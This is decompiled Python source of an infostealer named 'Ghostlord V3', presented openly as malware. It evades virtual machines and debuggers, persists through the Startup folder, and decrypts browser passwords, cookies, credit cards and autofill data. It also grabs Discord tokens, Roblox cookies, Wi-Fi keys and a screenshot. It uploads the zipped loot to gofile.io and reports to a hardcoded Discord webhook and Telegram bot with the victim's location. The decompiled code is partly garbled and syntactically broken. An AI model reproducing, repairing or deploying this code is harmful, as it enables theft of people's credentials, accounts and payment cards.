# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: <string>
# Bytecode version: 3.12.0rc2 (3531)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

global Cookie  # inserted
global PassCount  # inserted
global CookiCount  # inserted
global Hiscount  # inserted
global CreCount  # inserted
global AutofillCount  # inserted
import os
import time
import sys
import subprocess
import mss
from mss import tools
import wmi
import threading
import requests
import base64
from sqlite3 import connect as sql_connect
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import shutil
import ctypes
import random
import psutil
import getpass
import json
import re
import telebot
import urllib
import winreg
import warnings
from base64 import b64decode
from io import BytesIO
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from sys import executable, stderr
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
disable_warnings_urllib3()
ModuleRequirements = [['Crypto.Cipher', 'pycryptodome' if 'PythonSoftwareFoundation' not in executable else 'Crypto']]
for module in ModuleRequirements:
    try:
        __import__(module[0])
    except:
        subprocess.Popen(f'\"{executable}\" -m pip install {module[1]} --quiet', shell=True)
        time.sleep(3)
else:  # inserted
    pass  # postinserted
CONFIG_MODE = 'discord'
Ghostlord = '7308664213:AAHIgncN8z_tLs5zd56Aq9ya909pD0V-Fss'
chat_id = '6033717122'
bot = telebot.TeleBot(Ghostlord)
Ghostlord_webhook = 'https://discord.com/api/webhooks/1247490801039052850/CPZyFMYCNBc0AbDcjgqKo_7dcfc_a3X3SEWQPOaYUj5QEQ8opeh2I6I-KmIB0OXGSVT6'
ghostlord_art = 'https://rentry.co/fd6new3t/raw'
glre = requests.get(ghostlord_art)
ghostlord_art = glre.text

def refo(listt):
    e = re.findall('(\\w+[a-z])', listt)
    while 'https' in e:
        e.remove('https')
    while 'com' in e:
        e.remove('com')
    while 'net' in e:
        e.remove('net')
    return list(set(e))

def refomatwords(Words):
    rb = ' | '.join((da for da in Words))
    if len(rb) > 1000:
        rrrrr = refo(str(Words))
        return ' | '.join((da for da in rrrrr))
    return rb
keywords = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', '[stake](https://stake.com)']
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv('TEMP')
username = os.getenv('USERNAME')

class NullWriter(object):
    def write(self, arg):
        return
warnings.filterwarnings('ignore')
null_writer = NullWriter()
stderr = null_writer

def antidebug():
    checks = [check_windows, check_ip, check_registry, check_dll]
    for check in checks:
        t = threading.Thread(target=check, daemon=True)
        t.start()

def exit_program(reason):
    print(reason)
    ctypes.windll.kernel32.ExitProcess(0)

def check_dll():
    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
    if os.path.exists(os.path.join(sys_root, 'System32\\vmGuestLib.dll')) or os.path.exists(os.path.join(sys_root, 'vboxmrxnp.dll')):
        exit_program('VM Detected')

def check_windows():
    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
    def winEnumHandler(hwnd, ctx):
        title = ctypes.create_string_buffer(1024)
        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
        assert title.value.decode('Windows-1252').lower() in {'titanhide', 'systemexplorer', 'process', 'george', 'titanhide', 'process hacker 2', 'james', 'titanhide', 'scyllaHide', 'dnspy', 'cse pro', 'httpdebugger', 'dbx', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'titanhide', 'process', 'titanhide', 'charles', 'de4dotmodded', 'megadumper', 'dojandqwklndoqwd-x86', 'dojandqwklndoqwd', 'mdb', 'de4dotmodded', 'httpdebugger',
        pid = ctypes.c_ulong(0)
        ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        if pid.value!= 0:
            try:
                handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
                ctypes.windll.kernel32.TerminateProcess(handle, (-1))
                ctypes.windll.kernel32.CloseHandle(handle)
            except:
                pass
        else:  # inserted
            pass  # postinserted
        exit_program(f"Debugger Open, Type: {title.value.decode('utf-8')}")
        return True
    while True:
        ctypes.windll.user32.EnumWindows(winEnumHandler, None)
        time.sleep(0.5)

def check_ip():
    blacklisted = {'194.154.78.160', '95.25.81.24', '35.192.93.107', '212.119.227.167', '195.74.76.222', '188.105.91.143', '92.211.55.199', '84.147.62.12', '87.166.50.213', '212.119.227.151', '35.185.226.17', '34.105.72.241', '195.239.51.59', '188.105.91.173', '192.40.57.234', '95.25.204.90', '34.145.195.58', '35.185.226.17', '104.198.155.173', '188.105.91.173', '195.239.51.3', '84.147.62.12', '34.145.195.58', '95.25.81.24', '95.25.204.90', '34.145.195.58', '84.147.62.12', '34.145.195.58', '192.87.28.103', '34.145.195.58', '195.239.51.59', '34.145.195.58', '34.145.195.58', '34.145.195.58', '188.105.91.173', '34.145.195.58', '188.105.91.173', '34.145.195.58', '34.145.195.58', '34.145.195.58', '212.119.227.151', '34.145.195.58', '212.119.227.151', '192.87.28.103', '34.145.195.58', '212.119.227.151', '195.239.51.59', '109.74.154.92', '192.87.28.103', '92.211.55.199', '
    while True:
        try:
            ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
            if ip in blacklisted:
                exit_program('Blacklisted IP Detected')
            return None
        except:
            pass

def check_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Enum\\IDE', 0, winreg.KEY_READ)
        subkey_count = winreg.QueryInfoKey(key)[0]
        for i in range(subkey_count):
            subkey = winreg.EnumKey(key, i)
            if subkey.startswith('VMWARE'):
                exit_program('VM Detected')
        winreg.CloseKey(key)
    except:
        return

def getip():
    return urlopen(Request('https://api.ipify.org')).read().decode().strip()
    except:
        pass  # postinserted
    return 'None'

def globalInfo():
    try:
        Ip = getip()
        api_key = '21DA3C31774AD4821B0A69362DC07ACB'
        url = f'https://api.ip2location.io/?key={api_key}&ip={Ip}'
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            country_name = data.get('country_name')
            country_code = data.get('country_code')
            city_name = data.get('city_name')
            region_name = data.get('region_name')
            globalinfo = f'🌏*IP*: {Ip}\n🌏Country: {country_name}\n🌏Region: {region_name}\n🌏City: {city_name}\n🌏Country Code: {country_code}\n'
            return globalinfo
    except Exception as e:
        return '🌏*Cannot get victim\'s ip*\n'
Ip = getip()
ipdatanojson = urlopen(Request(f'https://geolocation-db.com/jsonp/{Ip}')).read().decode().replace('callback(', '').replace('})', '}')
ipdata = json.loads(ipdatanojson)
contryCode = ipdata['country_code']

def makedir():
    try:
        username = os.getenv('USERNAME')
        upload_folder = os.path.join(temp, f'{contryCode}_Ghostlord_' + username)
        os.makedirs(upload_folder, exist_ok=True)
    except:
        return
makedir()
if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:  # inserted
    currentFilePath = os.path.dirname(os.path.abspath(__file__))
fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)
startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)
if os.path.abspath(filePath).lower()!= os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file:
        with open(startupFilePath, 'wb') as dst_file:
            shutil.copyfileobj(src_file, dst_file)

class DATA_BLOB(Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', POINTER(c_char))]

def Getdata(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def Creeper(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 1, byref(blob_out)):
        return Getdata(blob_out)
    return None

def Decreeper(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:(-16)].decode()
        return decrypted_pass
    return None
CookiCount, PassCount, CreCount, AutofillCount, Hiscount = (0, 0, 0, 0, 0)
cookiess = []

def getpass(path, arg):
    global PassCount  # inserted
    try:
        Pass = []
        if not os.path.exists(path):
            return
        pathC = path + arg + '/Login Data'
        if os.stat(pathC).st_size == 0:
            return
    except:
        pass  # postinserted
    return None
    else:  # inserted
        tempfold = temp + 'gl' + ''.join((random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8))) + '.db'
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        pathKey = path + '/Local State'
        with open(pathKey, 'r', encoding='utf-8') as f:
            local_state = json_loads(f.read())
                master_key = b64decode(local_state['os_crypt']['encrypted_key'])
                master_key = Creeper(master_key[5:])
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                data = cursor.fetchall()
                for row in data:
                    if row[0]!= '' and row[1]!= '' and (row[2]!= ''):
                        pass  # postinserted
                    else:  # inserted
                        Pass.append(f'Site: {row[0]}\nUser: {row[1]}\nPass: {Decreeper(row[2], master_key)}\n')
                        PassCount += 1
                else:  # inserted
                    destination_folder = os.path.join(temp, f'{contryCode}_Ghostlord_' + username, 'Credentials')
                    os.makedirs(destination_folder, exist_ok=True)
                    destination_file = os.path.join(destination_folder, 'Browser Passwords.txt')
                    with open(destination_file, 'w', encoding='utf-8') as f:
                        f.write(ghostlord_art)
                        for line in Pass:
                            f.write(line + '\n')
                            cursor.close()
                            conn.close()
                            os.remove(tempfold)
Cookie = []

def getcookie(path, arg):
    global CookiCount  # inserted
    try:
        if not os.path.exists(path):
            return
        pathC = path + arg + '/Cookies'
        if os.stat(pathC).st_size == 0:
            return
    except:
        pass  # postinserted
    return None
    else:  # inserted
        tempfold = temp + 'gl' + ''.join((random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8))) + '.db'
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
        data = cursor.fetchall()
        pathKey = path + '/Local State'
        with open(pathKey, 'r', encoding='utf-8') as f:
            local_state = json_loads(f.read())
                master_key = b64decode(local_state['os_crypt']['encrypted_key'])
                master_key = Creeper(master_key[5:])
                destination_folder = os.path.join(temp, f'{contryCode}_Ghostlord_' + username, 'Credentials')
                os.makedirs(destination_folder, exist_ok=True)
                destination_file = os.path.join(destination_folder, 'Browser Cookies.txt')
                for row in data:
                    if row[0]!= '':
                        for wa in keywords:
                            old = wa
                            if 'https' in wa:
                                tmp = wa
                                wa = tmp.split('[')[1].split(']')[0]
                            if wa in row[0] and old not in cookiess:
                                pass  # postinserted
                            else:  # inserted
                                cookiess.append(old)
                        else:  # inserted
                            Cookie.append(f'{row[0]}\tTRUE\t/\tFALSE\t2597573456\t{row[1]}\t{Decreeper(row[2], master_key)}\n\n')
                            CookiCount += 1
                else:  # inserted
                    with open(destination_file, 'a') as f:
                        f.write(ghostlord_art)
                        for line in Cookie:
                            f.write(line + '\n')
                            cursor.close()
                            conn.close()
                            os.remove(tempfold)

def getcre(path, arg):
    global CreCount  # inserted
    try:
        if not os.path.exists(path):
            return
        pathC = path + arg + '/Web Data'
        if os.stat(pathC).st_size == 0:
            return
    except:
        pass  # postinserted
    return None
    else:  # inserted
        tempfold = temp + 'gl' + ''.join((random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8))) + '.db'
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        pathKey = path + '/Local State'
        with open(pathKey, 'r', encoding='utf-8') as f:
            local_state = loads(f.read())
                master_key = b64decode(local_state['os_crypt']['encrypted_key'])
                master_key = Creeper(master_key[5:])
                destination_folder = os.path.join(temp, f'{contryCode}_Ghostlord_' + username, 'Credentials')
                os.makedirs(destination_folder, exist_ok=True)
                destination_file = os.path.join(destination_folder, 'Credit Cards.txt')
                with open(destination_file, 'a', encoding='utf-8') as f:
                    f.write(ghostlord_art)
                    cursor.execute('SELECT * FROM credit_cards ')
                    data = cursor.fetchall()
                    for row in data:
                        if row[0]!= '':
                            f.write(f'Card Name: {row[1]} | Numbers: {Decreeper(row[4], master_key)} | Expiry: {row[2]}/{row[3]}\n\n')
                            CreCount += 1
                        cursor.close()
                        conn.close()
                        os.remove(tempfold)

def getatfil(path, arg):
    global AutofillCount  # inserted
    try:
        if not os.path.exists(path):
            return
        pathC = path + arg + '/Web Data'
        if os.stat(pathC).st_size == 0:
            return
    except:
        pass  # postinserted
    return None
    else:  # inserted
        tempfold = temp + 'gl' + ''.join((random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8))) + '.db'
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        destination_folder = os.path.join(temp, f'{contryCode}_Ghostlord_' + username, 'Credentials')
        os.makedirs(destination_folder, exist_ok=True)
        destination_file = os.path.join(destination_folder, 'AutoFills.txt')
        with open(destination_file, 'a', encoding='utf-8') as f:
            f.write(ghostlord_art)
            cursor.execute('SELECT * FROM autofill WHERE value NOT NULL')
            data = cursor.fetchall()
            for row in data:
                if row[0]!= '':
                    f.write(f'Name: {row[0]} | Value: {row[1]}\n\n')
                    AutofillCount += 1
                cursor.close()
                conn.close()
                os.remove(tempfold)

def gethis(path, arg):
    global Hiscount  # inserted
    try:
        if not os.path.exists(path):
            return
        pathC = path + arg + 'History'
        if os.stat(pathC).st_size == 0:
            return
    except:
        pass  # postinserted
    return None
    else:  # inserted
        tempfold = temp + 'gl' + ''.join((random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8))) + '.db'
        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        destination_folder = os.path.join(temp, f'{contryCode}_Ghostlord_' + username, 'Credentials')
        os.makedirs(destination_folder, exist_ok=True)
        destination_file = os.path.join(destination_folder, 'Histories.txt')
        with open(destination_file, 'a', encoding='utf-8') as f:
            f.write(ghostlord_art)
            cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls')
            data = cursor.fetchall()
            for row in data:
                if not row[0] or not row[1] or (not row[2]):
                    f.write(f'Url: {row[0]}\nTitle: {row[1]}\nVisited: {row[2]}\nLast Visited: {row[3]}\n\n')
                    Hiscount += 1
                cursor.close()
                conn.close()
                os.remove(tempfold)

def StealSystemInfo():
    process = subprocess.run('systeminfo', capture_output=True, shell=True)
    output1 = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
    if output1:
        lines = output1.split('\n')
        system_info = {}
        for line in lines:
            parts = line.split(':')
            if len(parts) == 2:
                key = parts[0].strip()
                value = parts[1].strip()
                system_info[key] = value
        data = '\n'.join([f'{key}: {value}' for key, value in system_info.items()])
        destination_folder = os.path.join(temp, f'{contryCode}_Ghostlord_' + username, 'System')
        os.makedirs(destination_folder, exist_ok=True)
        destination_file = os.path.join(destination_folder, 'System Info.txt')

def gettoken():
    tokens = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {'Discord': roaming + '\\Discord', 'Discord Canary': roaming + '\\discordcanary', 'Discord PTB': roaming + '\\discordptb', 'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default', 'Opera': roaming + '\\Opera Software\\Opera Stable', 'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default', 'Lightcord': local + '\\Lightcord', 'Opera GX': local + '\\Opera Software\\Opera GX Stable', 'Amigo': local + '\\Amigo\\User Data', 'Torch': local + '\\Torch\\User Data', 'Kometa': local + '\\Kometa\\User Data', 'Orbitum': local + '\\Orbitum\\User Data', 'CentBrowser': local + '\\CentBrowser\\User Data', 'Sputnik': local + '\\Sputnik\\Sputnik\\User Data', 'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data', 'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data', 'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default', 'Uran':
        pass  # postinserted
    username = os.getenv('USERNAME')
    temp = os.getenv('TEMP')
    destination_folder = os.path.join(temp, f'{contryCode}_Ghostlord_' + username, 'Discord')
    os.makedirs(destination_folder, exist_ok=True)
    destination_file = os.path.join(destination_folder, 'Token.txt')
    for platform, path in paths.items():
        path = os.path.join(path, 'local Storage', 'leveldb')
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and (not file_name.endswith('.ldb')) and (not file_name.endswith('.sqlite')):
                continue
            with open(os.path.join(path, file_name), errors='ignore') as file:
                for line in file.readlines():
                    for regex in ['[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}']:
                        for token in re.findall(regex, line):
                            token_entry = f'{token} | {platform}'
                            if token_entry not in tokens:
                                tokens.append(token_entry)
    with open(destination_file, 'w') as f:
        for token in tokens:
            f.write(token + '\n')

def StealRobloxCookies():
    Separator = '\n'
    note = '# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not.'
    cookies = []
    browserCookies = '\n'.join(Cookie)
    for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', browserCookies):
        cookies.append(match)
    output = list()
    for item in ['HKCU', 'HKLM']:
        process = subprocess.run('powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY'.format(item), capture_output=True, shell=True)
        if not process.returncode:
            output.append(process.stdout.decode(errors='ignore'))
    for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', '\n'.join(output)):
        cookies.append(match)
    cookies = [*set(cookies)]
    if cookies:
        destination_folder = os.path.join(temp, f'{contryCode}_Ghostlord_' + username, 'Roblox')
        os.makedirs(destination_folder, exist_ok=True)
        destination_file = os.path.join(destination_folder, 'Roblox Cookies.txt')
        with open(destination_file, 'w') as file:
            file.write('{}{}{}'.format(note, Separator, Separator.join(cookies)))

def GetWifiPasswords():
    profiles = list()
    passwords = dict()
    Separator = '\n'
    for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
        if 'All User Profile' in line:
            name = line[line.find(':') + 1:].strip()
            profiles.append(name)
    for profile in profiles:
        found = False
        for line in subprocess.run(f'netsh wlan show profile \"{profile}\" key=clear', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
            if 'Key Content' in line:
                passwords[profile] = line[line.find(':') + 1:].strip()
                found = True
                break
        if not found:
            passwords[profile] = '(None)'
    for profile, psw in passwords.items():
        profiles.append(f'Network: {profile}\nPassword: {psw}')
    if profiles:
        destination_folder = os.path.join(temp, f'{contryCode}_Ghostlord_' + username, 'System')
        os.makedirs(destination_folder, exist_ok=True)
        destination_file = os.path.join(destination_folder, 'Wifi Passwords.txt')
        with open(destination_file, 'w', encoding='utf-8', errors='ignore') as file:
            file.write(Separator.lstrip() + Separator.join(profiles))

def kill_browser_processes(process_name):
    for process in psutil.process_iter():
        try:
            if process.name() == process_name:
                process.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass  # postinserted
        pass
    else:  # inserted
        pass
Threadlist = []

def process_browser_paths(paths):
    browser_processes = ['opera.exe', 'chrome.exe', 'brave.exe', 'vivaldi.exe', 'yandex.exe', 'msedge.exe', 'browser.exe']
    for path_info in paths:
        process_name = path_info[1]
        if process_name in browser_processes:
            kill_browser_processes(process_name)
    for patt in paths:
        pass_thread = threading.Thread(target=getpass, args=[patt[0], patt[3]])
        atfil_thread = threading.Thread(target=getatfil, args=[patt[0], patt[3]])
        cre_thread = threading.Thread(target=getcre, args=[patt[0], patt[3]])
        his_thread = threading.Thread(target=gethis, args=[patt[0], patt[3]])
        his_thread.start()
        pass_thread.start()
        atfil_thread.start()
        cre_thread.start()
        Threadlist.extend([his_thread, pass_thread, atfil_thread, cre_thread])

def process_cookies(paths):
    ThCokk = []
    for patt in paths:
        a = threading.Thread(target=getcookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)
    for thread in ThCokk:
        thread.join()

def gather_system_info():
    System = []
    b = threading.Thread(target=StealSystemInfo)
    c = threading.Thread(target=gettoken)
    d = threading.Thread(target=StealRobloxCookies)
    e = threading.Thread(target=GetWifiPasswords)
    b.start()
    c.start()
    d.start()
    e.start()
    System.extend([b, c, d, e])
    for thread in System:
        thread.join()

def GatherAll():
    """                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                     Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  """  # inserted
    /Profile 6/Network = [[f'{roaming}/Opera Software/Opera GX Stable', f'opera.exe', f'/Local Storage/leveldb', '/', '/Network', '/Local Extension Settings/'], [f'{roaming}/Opera Software/Opera Stable', f'opera.exe', f'/Local Storage/leveldb', '/', '/Network', '/Local Extension Settings/'], [f'{roaming}/Opera Software/Opera Stable', f'chrome.exe', f'/Default/Local Storage/leveldb', f'/Default/', f'/Default/Network', f'/Default/Local Extension Settings/'], [f'/Default/Local Storage/leveldb', f'/Default/', f'/Default/Network', f'/Default/Local Extension Settings/'], [f'/Default/Local Storage/leveldb', f'/Default/', f'/Default/Network', f'/Default/Local Extension Settings/'], [f'/Default/Local Storage/leveldb', f'/Default/', f'/Default/Network', f'/Default/Local Extension Settings/'], [f'/Default/Local Storage/leveldb', f'/Default/', f'/Default/Network', f'/Default/Local Extension Settings/'], [f'/Default/Local Storage/leveldb', f'/Default/', f'/Default/Network', f'/Default/Local Extension Settings/'], [f'
    process_browser_paths(browserPaths)
    process_cookies(browserPaths)
    gather_system_info()

def get_mac_address():
    for interface, addrs in psutil.net_if_addrs().items():
        if interface == 'Wi-Fi':
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac = addr.address
                    return mac
    else:  # inserted
        return

def machineinfo():
    totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
    totalMemory = str(int(int(totalMemory[1]) / 1000000000)) + ' GB' if len(totalMemory) >= 1 else 'Unable to detect total memory'
    c = wmi.WMI()
    for gpu in c.Win32_DisplayConfiguration():
        GPUm = gpu.Description.strip()
    mac = get_mac_address()
    result = f'💻Username: {username.upper()}\n💻Ram: {totalMemory}\n💻GPU: {GPUm}\n💻Mac: {mac}\n'
    return result

def capture():
    temp_photo_path = os.path.join(temp, 'screenshot.png')
    with mss.mss() as sct:
        screenshot = sct.grab(sct.monitors[0])
        tools.to_png(screenshot.rgb, screenshot.size, output=temp_photo_path)
    destination_path = os.path.join(temp, f'{contryCode}_Ghostlord_{username}')
    shutil.move(temp_photo_path, destination_path)
    try:
        os.remove(temp_photo_path)
    except FileNotFoundError:
        pass  # postinserted
    return None
    else:  # inserted
        pass  # postinserted
    pass
capture()

def upload_to_gofile(zip_file_name):
    try:
        server_response = requests.get('https://api.gofile.io/getServer').json()
        server = server_response['data']['server']
        with open(zip_file_name, 'rb') as file:
            pass  # postinserted
    except Exception as e:
            response = requests.post(f'https://{server}.gofile.io/uploadFile', files={'file': file})
                if response.status_code == 200:
                    download_page_url = response.json()['data']['downloadPage']
                    return download_page_url
            return None

def send_telegram_message(download_link):
    try:
        Ip = getip()
        api_key = '21DA3C31774AD4821B0A69362DC07ACB'
        url = f'https://api.ip2location.io/?key={api_key}&ip={Ip}'
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            latitude = data.get('latitude')
            longitude = data.get('longitude')
            country_code = data.get('country_code')
    except Exception:
        pass  # postinserted
    else:  # inserted
        text = f'\n    *Ghostlord V3*\n\n{globalInfo()}{machineinfo()}🌐Passwords Found: {PassCount}\n🌐Cookies Found: {CookiCount}\n🌐Histories Found: {Hiscount}\n🌐Autofills Found: {AutofillCount}\n🌐CreditCards Found: {CreCount}\n\n🍪 *Ghostlord Cookies Filter*: {refomatwords(cookiess)}\n\n*Location*: [View](https://www.google.com/maps/search/google+map+{latitude},{longitude})\n\n*Download*: [{country_code}_Ghostlord_{username}.zip]({download_link})\n\n    '
        bot.send_message(chat_id=chat_id, text=text, parse_mode='Markdown')
        latitude, longitude = ('Unknown', 'Unknown')
    else:  # inserted
        pass

def send_discord_message(download_link):
    webhook_url = 'https://discord.com/api/webhooks/1247490801039052850/CPZyFMYCNBc0AbDcjgqKo_7dcfc_a3X3SEWQPOaYUj5QEQ8opeh2I6I-KmIB0OXGSVT6'
    try:
        Ip = getip()
        api_key = '21DA3C31774AD4821B0A69362DC07ACB'
        url = f'https://api.ip2location.io/?key={api_key}&ip={Ip}'
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            latitude = data.get('latitude')
            longitude = data.get('longitude')
            country_code = data.get('country_code')
    except Exception:
        pass  # postinserted
    else:  # inserted
        image_url = 'https://raw.githubusercontent.com/ThiennDanng/Spam-Tele/main/GhostlordV3.jpg'
        payload = {'embeds': [{'title': 'Ghostlord V3', 'description': f'**```{globalInfo()}{machineinfo()}🌐Passwords Found: {PassCount}\n🌐Cookies Found: {CookiCount}\n🌐Histories Found: {Hiscount}\n🌐Autofills Found: {AutofillCount}\n🌐CreditCards Found: {CreCount}\n```**\nLocation: [View](https://www.google.com/maps/search/google+map+{latitude},{longitude})\n**```https://www.google.com/maps/search/google+map+{latitude},{longitude}```**\nDownload: [{country_code}_Ghostlord_{username}.zip]({download_link})\n**```{download_link}```**', 'color': 34303, 'footer': {'text': 'Ghostlord V3 | t.me/thiendangg'}}], 'username': 'Ghostlord', 'avatar_url': image_url}
        response = requests.post(Ghostlord_webhook, json=payload)
        latitude, longitude = ('Unknown', 'Unknown')
    else:  # inserted
        pass

def main():
    functions = [antidebug, GatherAll]
    threads = [threading.Thread(target=func) for func in functions]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    folder_path = os.path.join(temp, f'{contryCode}_Ghostlord_' + username)
    zip_file_name = os.path.join(local, f'{contryCode}_Ghostlord_' + username)
    shutil.make_archive(zip_file_name, 'zip', folder_path)
    shutil.rmtree(folder_path)
    zip_file_path = f'{zip_file_name}.zip'
    download_link = upload_to_gofile(zip_file_path)
    if download_link:
        if CONFIG_MODE == 'telegram':
            send_telegram_message(download_link)
        else:  # inserted
            if CONFIG_MODE == 'discord':
                send_discord_message(download_link)
    os.remove(zip_file_path)
if __name__ == '__main__':
    main()